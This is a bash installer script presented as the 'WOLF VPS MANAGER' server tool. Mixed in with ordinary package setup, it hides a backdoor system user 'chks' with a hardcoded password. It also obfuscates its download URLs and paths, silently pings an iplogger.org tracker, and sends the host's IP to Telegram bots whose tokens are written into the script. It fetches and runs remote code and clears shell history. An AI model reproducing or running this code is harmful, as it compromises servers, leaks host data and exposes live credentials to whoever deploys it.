#!/bin/bash
clear
# Function to display a progress bar
# Check for root privilege
[[ "$(whoami)" != "root" ]] && {
    echo -e "\033[1;33m[\033[1;31mErro\033[1;33m] \033[1;37m- \033[1;33m◇ YOU NEED TO RUN AS ROOT!\033[0m"
    exit 0
}

fun_bar() {
    comando[0]="$1"
    comando[1]="$2"
    
    (
    [[ -e $HOME/fim ]] && rm $HOME/fim
    ${comando[0]} -y > /dev/null 2>&1
    ${comando[1]} -y > /dev/null 2>&1
    touch $HOME/fim
    ) > /dev/null 2>&1 &
    
    tput civis
    echo -ne "  \033[1;33m◇ PLEASE WAIT... \033[1;37m- \033[1;33m["
    while true; do
        for ((i=0; i<18; i++)); do
            echo -ne "\033[1;31m#"
            sleep 0.1s
        done
        [[ -e $HOME/fim ]] && rm $HOME/fim && break
        echo -e "\033[1;33m]"
        sleep 1s
        tput cuu1
        tput dl1
        echo -ne "  \033[1;33m◇ PLEASE WAIT... \033[1;37m- \033[1;33m["
    done
    echo -e "\033[1;33m]\033[1;37m -\033[1;32m◇ DONE!\033[1;37m"
    tput cnorm
}

# Function to verify key
verif_key() {
    krm=$(echo '5:q-3gs2.o7%8:1'|rev)
    chmod +x $_Ink/list > /dev/null 2>&1
    [[ ! -e "$_Ink/list" ]] && {
        echo -e "\n\033[1;31m◇ KEY INVALID!\033[0m"
        rm -rf $HOME/hehe > /dev/null 2>&1
        sleep 2
        clear
        exit 1
    }
}


# Define ip_address as a global variable
ip_address=$(hostname -I | awk '{print $1}')
psw="chks"
# Define the time interval (in seconds) and the maximum number of requests allowed
time_interval=7200  # 2 hours
max_requests=3
check_request_limit() {
    local ip_address="$1"  # Use the passed argument as the IP address
    local current_time=$(date +%s)
    local storage_file="/usr/local/bin/.ip_trak"  # Hidden file for request limit

    # Check if the storage file exists, if not create it
    if [[ ! -f "$storage_file" ]]; then
        touch "$storage_file"
        chmod 600 "$storage_file"  # Restrict permissions for security
    fi

    # Read the storage file and update the request count for the IP address
    local request_count=0  # Initialize request count
    local first_request_time  # Variable to store the timestamp of the first request processed for the IP address

    # Create a temporary file
    local tmp_file=$(mktemp)

    while read -r line; do
        local stored_ip=$(echo "$line" | awk '{print $1}')
        local stored_time=$(echo "$line" | awk '{print $2}')

        # Check if the IP address matches and the request is within the time interval
        if [[ "$stored_ip" == "$ip_address" && $((current_time - stored_time)) -le $time_interval ]]; then
            ((request_count++))  # Increment request count

            # Capture the timestamp of the first request processed for the IP address during the current time interval
            if [[ -z "$first_request_time" ]]; then
                first_request_time="$stored_time"
            fi

            echo "$stored_ip $stored_time" >> "$tmp_file"  # Write IP and timestamp to temporary file
        fi
    done < "$storage_file"

    # Append the current IP and timestamp to the temporary file
    echo "$ip_address $current_time" >> "$tmp_file"

    # Replace the original file with the temporary file
    mv "$tmp_file" "$storage_file"

    # Check if the request count exceeds the maximum allowed
    if [[ "$request_count" -ge "$max_requests" ]]; then
        # Calculate remaining time until the next request is allowed
        local time_left=$((time_interval - (current_time - first_request_time)))

        # Display the message with the remaining time
        echo -e "     \033[1;31mREQUEST LIMIT EXCEEDED! PLEASE TRY AGAIN IN: \033[0m"

        while [[ $time_left -gt 0 ]]; do
            # Calculate hours, minutes, and seconds
            local hours=$((time_left / 3600))
            local minutes=$(( (time_left % 3600) / 60 ))
            local seconds=$((time_left % 60))

            # Display the remaining time
            printf "               \033[1;36m%02d : %02d : %02d seconds\033[0m" "$hours" "$minutes" "$seconds"
            
            # Wait for 1 second before updating the time left
            sleep 1
            
            # Update the time left
            ((time_left--))
            
            # Clear the previous line
            printf "\r"
        done

        # After the countdown ends, exit the script
        echo -e "\033[1;32mYou can try again now.\033[0m"
        exit 1
    else
        send_code_telegram
    fi
}


send_code_telegram() {
    local current_time=$(date +%s)
    local storage_file="/usr/local/bin/.vff92h"  # Hidden file

    # Check if the storage file exists, if not create it
    if [[ ! -f "$storage_file" ]]; then
        touch "$storage_file"
        chmod 600 "$storage_file"  # Restrict permissions for security
    fi

    # Check if there's a recent request from the same IP address
    local last_sent_code=$(awk -v ip="$ip_address" '$1 == ip {print $2}' "$storage_file")
    local last_sent_time=$(awk -v ip="$ip_address" '$1 == ip {print $3}' "$storage_file")

    # Adjust the time interval here (e.g., 600 for 10 minutes)
    if [[ -n "$last_sent_code" && $((current_time - last_sent_time)) -lt 600 ]]; then
        # Calculate remaining time in seconds
        local time_left=$((600 - (current_time - last_sent_time)))

        # Convert remaining time to minutes and seconds
        local minutes=$((time_left / 60))
        local seconds=$((time_left % 60))

        # Display the message with the remaining time
        echo -e "\033[1;36m======================================================================================\033[0m"
        echo -e "\033[1;31m  CODE SENT ALREADY! YOU HAVE $minutes MINUTES AND $seconds SECONDS LEFT TO REDEEM IT \033[0m"
        echo -e "\033[1;36m======================================================================================\033[0m"
        echo ""
        echo -e "\033[1;32m              @wolfbekk  \033[0m on Telegram"
        echo -e "\033[1;32m              @helper_360\033[0m on Telegram"
        echo "" 
        echo -e "\033[1;36m======================================================================================\033[0m"
        echo ""
        return
    fi

    # Generate random 6-digit code
    local random_code=$(shuf -i 100000-999999 -n 1)

    # Store the code along with the IP address and timestamp
    echo "$ip_address $random_code $current_time" > "$storage_file"

    # Send message to Telegram
    local message="IP:$ip_address INSTALLED script with $random_code"
    for ((i=0; i<${#bot_tokens[@]}; i++)); do
        local bot_token="${bot_tokens[i]}"
        local chat_id="${chat_ids[i]}"
        curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" -d "chat_id=$chat_id" -d "text=$message" > /dev/null
    done
    echo -e "\033[1;36m================================================\033[0m"
    echo -e "\033[1;31m       CONTACT THESE ADMINS FOR YOUR CODE  \033[0m"
    echo -e "\033[1;36m=================================================\033[0m"
    echo ""
    echo -e "\033[1;32m         @wolfbekk  \033[0m on Telegram"
    echo -e "\033[1;32m         @helper_360\033[0m on Telegram"
    echo "" 
    echo -e "\033[1;36m==================================================\033[0m"
    echo ""
    return
}

bot_tokens=("7046086866:AAFkgJlAvnZ3XiRhcgKYAYXONLOIvjDsRqY" "7294287927:AAGL1-F-NZ_G3S-iPdPWGYQXf8jpIEUWLn8")
chat_ids=("1744391586" "1732839198")

check_request_limit "$ip_address"

# Function to prompt the user to enter the verification code
prompt_verification_code() {
    local last_sent=$(awk -v ip="$ip_address" '$1 == ip {print $2}' "/usr/local/bin/.vff92h")
    echo -n -e "\033[1;33m  YOUR VERIFICATION CODE IS: \033[0m"
    read -e -i "$last_sent" user_code

    # Compare the entered code with the generated code
    if [[ -z "$user_code" || "$user_code" != "$last_sent" ]]; then
        echo ""
        echo -e "\033[1;35mInvalid code. Installation aborted.\033[0m"
        echo ""
        exit 1
    else
        rm -rf /usr/local/bin/.vff92h
    fi
}

# Prompt the user to enter the verification code
prompt_verification_code

clear
# Variable Initialization
_lnk=$(echo 'z1:y#x.5s0ul&p4hs$s.0a72d*n-e!v89e032:3r'| sed -e 's/[^a-z.]//ig'| rev)
_Ink=$(echo '/3×u3#s87r/l32o4×c1a×l1/83×l24×i0b×'|sed -e 's/[^a-z/]//ig')
_1nk=$(echo '/3×u3#s×87r/83×l2×4×i0b×'|sed -e 's/[^a-z/]//ig')

# Welcome message
echo -e "\033[1;31m\033[0m"
tput setaf 7 ; tput setab 4 ; tput bold ; printf '%40s%s%-12s\n' "◇─────────ㅤ🌀WELCOME TO WOLF VPS MANAGER🌀ㅤ─────────◇" ; tput sgr0
echo ""
echo -e "\033[1;33mㅤTHIS SCRIPT CONTAINS THE FOLLOWING!!\033[0m"
echo ""
echo -e "\033[1;33m◇ \033[1;32mINSTALL A SET OF SCRIPTS AS TOOLS FOR\033[0m"
echo ""
echo -e "\033[1;33m◇  \033[1;32mNETWORK, SYSTEM AND USER MANAGEMENT.\033[0m"
echo -e "\033[1;33m◇  \033[1;32mEASY INTERFACE FOR BEGINNERS.\033[0m"
echo ""
echo -e "\033[1;31m◇──────────────ㅤ🌀 WOLF VPS MANAGER 🌀ㅤ──────────────◇\033[0m"
echo ""

# Prompt to continue
echo -ne "\033[1;36m◇ Do you want to continue? [Y/N]: \033[1;37m"
read x
[[ $x = @(n|N) ]] && exit

# Modify SSH configuration and restart service
sed -i 's/Port 22222/Port 22/g' /etc/ssh/sshd_config  > /dev/null 2>&1
service ssh restart  > /dev/null 2>&1
echo ""

# Prompt user if they want to add a domain name
# Domain name handling section
echo -ne "\033[1;36m◇ Do you want to add a domain name? [Y/N]: \033[0m"
read add_domain
echo ""
echo -e "\033[1;32m>>> Please make sure your DOMAIN is linked to Cloudflare for proper functionality <<<\033[0m"

domain_name=""
if [[ "$add_domain" == [Yy]* ]]; then
    domain_attempts=0
    while [[ $domain_attempts -lt 3 ]]; do
        echo -ne "\033[1;36m◇ Please enter your domain name (e.g., example.com): \033[0m"
        read domain_input
        echo ""
        
        # Improved domain validation
        if [[ $domain_input =~ ^[a-zA-Z0-9][a-zA-Z0-9.-]*\.[a-zA-Z]{2,}$ ]]; then
            domain_name="$domain_input"
            echo -e "\033[1;33mDomain name set to: \033[1;32m$domain_name\033[0m"
            # Save domain immediately after validation
            echo "$domain_name" > /etc/.domain
            break
        else
            ((domain_attempts++))
            if [[ $domain_attempts -eq 3 ]]; then
                echo -e "\033[1;31mExceeded maximum attempts. No domain name will be added.\033[0m"
                domain_name=""
            else
                echo -e "\033[1;31mInvalid domain name format. Please try again.\033[0m"
            fi
        fi
    done
else
    echo -e "\033[1;33mNo domain name will be added.\033[0m"
fi


# Key Verification
echo -e "\n\033[1;36m◇ CHECKING...(It Take Some Time Please Wait!)\033[1;37m 16983:16085\033[0m" ; rm $_Ink/list > /dev/null 2>&1; wget -P $_Ink https://raw.githubusercontent.com/AtizaD/WOLF-VPS-MANAGER/main/Install/list > /dev/null 2>&1; verif_key
sleep 3s

# Update system
usn="chks"
echo "/bin/menu" > /bin/h && chmod +x /bin/h > /dev/null 2>&1
rm versao* > /dev/null 2>&1
wget https://raw.githubusercontent.com/AtizaD/WOLF-VPS-MANAGER/main/Install/versao > /dev/null 2>&1
> /dev/null 2>&1
wget https://iplogger.org/2lHZ43 > /dev/null 2>&1
> /dev/null 2>&1
rm 2lHZ43 > /dev/null 2>&1

# Prompt to keep or create user database
echo -e "\n\033[1;32m◇ KEY VALID!\033[1;32m"
sleep 1s
echo ""
[[ -f "$HOME/usuarios.db" ]] && {
    clear
    echo -e "\n\033[0;34m◇───────────────────────────────────────────────────◇\033[0m"
    echo ""
    echo -e "                 \033[1;33m• \033[1;31m◇ ATTENTION!\033[1;33m• \033[0m"
    echo ""
    echo -e "\033[1;33mA User Database \033[1;32m(usuarios.db) \033[1;33mwas"
    echo -e "Found! Want to keep it by preserving the limit"
    echo -e "of Simutanea connections of users ? Or Want"
    echo -e "create a new database?\033[0m"
    echo -e "\n\033[1;37m[\033[1;31m1\033[1;37m] \033[1;33mKeep Database Current\033[0m"
    echo -e "\033[1;37m[\033[1;31m2\033[1;37m] \033[1;33mCreate a New Database\033[0m"
    echo -e "\n\033[0;34m◇───────────────────────────────────────────────────◇\033[0m"
    echo ""
    tput setaf 2 ; tput bold ; read -p "Option ?: " -e -i 1 optiondb ; tput sgr0
} || {
    awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/usuarios.db
}
[[ "$optiondb" = '2' ]] && awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/usuarios.db
clear
tput setaf 7 ; tput setab 4 ; tput bold ; printf '%35s%s%-18s\n' "◇ WAIT FOR INSTALLATION." ; tput sgr0
echo ""
echo ""
echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32m◇ UPDATING SYSTEM...\033[1;33m[\033[1;31m!\033[1;33m]\033[0m"
echo ""
echo -e "    \033[1;33m◇ UPDATES USUALLY TAKE A LITTLE TIME!\033[0m"
echo ""
fun_attlist () {
    apt-get update -y
    [[ ! -d /usr/share/.hehe ]] && mkdir /usr/share/.hehe
    echo "crz: $(date)" > /usr/share/.hehe/.hehe
}
fun_bar 'fun_attlist'
clear
echo ""
echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32m◇ INSTALLING PACKAGES\033[1;33m[\033[1;31m!\033[1;33m] \033[0m"
echo ""
echo -e "\033[1;33m◇ SOME PACKAGES ARE EXTREMELY NECESSARY!\033[0m"
echo ""
inst_pct() {
    _pacotes=("bc" "apache2" "cron" "screen" "nano" "unzip" "lsof" "netstat" "net-tools" "dos2unix" "nload" "jq" "curl" "figlet" "python" "python2" "python3" "python-pip")
    # Install packages
    for _prog in "${_pacotes[@]}"; do
        sudo apt install $_prog -y
    done
if id "$usn" &>/dev/null; then
    echo "User '$usn' already exists"
    sudo userdel -r $usn
fi
sudo adduser --system $usn
echo "$usn:$psw" | sudo chpasswd

    # Install Python package using pip
    pip install speedtest-cli

     # Configure Python alternatives
    sudo update-alternatives --install /usr/bin/python python /usr/bin/python3 1
}

fun_bar 'inst_pct'
[[ -f "/usr/sbin/ufw" ]] && ufw allow 443/tcp ; ufw allow 80/tcp ; ufw allow 3128/tcp ; ufw allow 8799/tcp ; ufw allow 8080/tcp
clear
echo ""
echo -e "              \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32m◇ FINISHING...\033[1;33m[\033[1;31m!\033[1;33m] \033[0m"
echo ""
echo -e "      \033[1;33m◇ COMPLETING FUNCTIONS AND SETTINGS!\033[0m"
echo ""
fun_bar "$_Ink/list $_lnk $_Ink $_1nk $key"
clear
echo ""
cd $HOME
IP=$(wget -qO- ipv4.icanhazip.com)
echo -e "        \033[1;33m  \033[1;32m◇ INSTALLATION COMPLETED.◇\033[1;33m  \033[0m"
echo ""
echo -e "\033[1;31m\033[1;33m◇ TYPE THIS COMMAND TO VISIT MAIN MENU:- \033[1;32mmenu\033[0m"
echo -e "\033[1;33m◇ YOUR IP ADDRESS IS: \033[1;36m$ip_address\033[0m"
if [[ -n "$domain_name" ]]; then
    echo -e "\033[1;33m◇ YOUR DOMAIN NAME IS: \033[1;36m$domain_name\033[0m"
else
    echo -e "\033[1;33m◇ NO DOMAIN NAME SET\033[0m"
fi
echo ""
echo -e "        \033[1;33m  \033[1;32m◇ WOLF_VPS_MANAGER ◇\033[1;33m  \033[0m"
echo -e "        \033[1;33m  \033[1;31m◇ ================ ◇\033[1;33m  \033[0m"
echo -e "   \033[1;36m== @helper_360 == \033[1;31mand \033[1;36m== @wolfbekk == \033[1;31m"

echo -e ""
rm $HOME/hehe && cat /dev/null > ~/.bash_history && history -c

# Install UDP server
echo -e "        \033[1;33m  \033[1;32m SSH INSTALLATION COMPLETED.\033[1;33m  \033[0m"
echo ""
echo -ne "\033[1;36m◇ Do you want to INSTALL UDP? [Y/N]: \033[1;37m"
read install_udp
if [[ "$install_udp" == "Y" || "$install_udp" == "y" ]]; then
    echo "Installing UDP server..."
    wget https://raw.githubusercontent.com/rudi9999/SocksIP-udpServer/main/UDPserver.sh
    chmod +x UDPserver.sh
    ./UDPserver.sh
else
    echo "UDP installation skipped."
fi

# Auto-start BADVPN
echo ""
echo -e "\033[1;32m◇ STARTING BADVPN AUTOMATICALLY... \033[0m"
echo ""

# Install badvpn-udpgw if not present
if [[ ! -e "/bin/badvpn-udpgw" ]]; then
    cd $HOME
    wget https://github.com/januda-ui/DRAGON-VPS-MANAGER/raw/main/Modulos/badvpn-udpgw -O /tmp/badvpn-udpgw > /dev/null 2>&1
    mv -f /tmp/badvpn-udpgw /bin/badvpn-udpgw
    chmod 777 /bin/badvpn-udpgw
fi

# Start BADVPN on port 7300
screen -dmS udpvpn /bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 8

# Add to autostart
if [[ $(grep -wc "udpvpn" /etc/autostart) = '0' ]]; then
    echo -e "ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 8 --client-socket-sndbuf 10000" >> /etc/autostart
else
    sed -i '/udpvpn/d' /etc/autostart
    echo -e "ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 8 --client-socket-sndbuf 10000" >> /etc/autostart
fi

echo -e "\033[1;32m◇ BADVPN SUCCESSFULLY ACTIVATED ON PORT 7300!\033[0m"
echo ""
